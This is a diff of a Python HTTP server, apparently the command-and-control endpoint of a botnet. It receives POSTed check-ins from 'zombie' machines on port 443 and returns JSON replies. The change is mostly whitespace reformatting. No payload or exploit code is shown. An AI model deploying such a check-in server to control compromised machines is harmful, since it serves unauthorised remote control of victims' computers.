@@ -46,38 +46,39 @@ def process_zombie_checkin(json_object, public_ip):
 
 class PostHandler(BaseHTTPRequestHandler):
 
-    def do_POST(self):
-        length = int(self.headers.get('content-length'))
-        # Parse the form data posted
-        json_object = self.rfile.read(length).decode()
-        # Get public IP
-        public_ip = self.client_address[0]
-        # JSON data given by the zombie
-        json_response = process_zombie_checkin(json_object, public_ip)
+	def do_POST(self):
+		length = int(self.headers.get('content-length'))
+		# Parse the form data posted
+		json_object = self.rfile.read(length).decode()
+		# print(json_object)
+		# Get public IP
+		public_ip = self.client_address[0]
+		# JSON data given by the zombie
+		json_response = process_zombie_checkin(json_object, public_ip)
 
-        # Begin the response
-        self.send_response(200)
-        self.send_header('Content-Type',
-                         'text/plain; charset=utf-8')
-        self.end_headers()
-
-        out = io.TextIOWrapper(
-            self.wfile,
-            encoding='utf-8',
-            line_buffering=False,
-            write_through=True,
-        )
+		# Begin the response
+		self.send_response(200)
+		self.send_header('Content-Type',
+				'text/plain; charset=utf-8')
+		self.end_headers()
 	
-        # Echo back information about what was posted in the form
-        out.write(str(json_response))
-
-        # Disconnect our encoding wrapper from the underlying
-        # buffer so that deleting the wrapper doesn't close
-        # the socket, which is still being used by the server.
-        out.detach()
+		out = io.TextIOWrapper(
+			self.wfile,
+			encoding='utf-8',
+			line_buffering=False,
+			write_through=True,
+		)
+	
+		# Echo back information about what was posted in the form
+		out.write(str(json_response))
+	
+		# Disconnect our encoding wrapper from the underlying
+		# buffer so that deleting the wrapper doesn't close
+		# the socket, which is still being used by the server.
+		out.detach()
 
 def start():
-    from http.server import HTTPServer
-    server = HTTPServer(('0.0.0.0', 443), PostHandler)
-    server.serve_forever()
+	from http.server import HTTPServer
+	server = HTTPServer(('0.0.0.0', 443), PostHandler)
+	server.serve_forever()
 
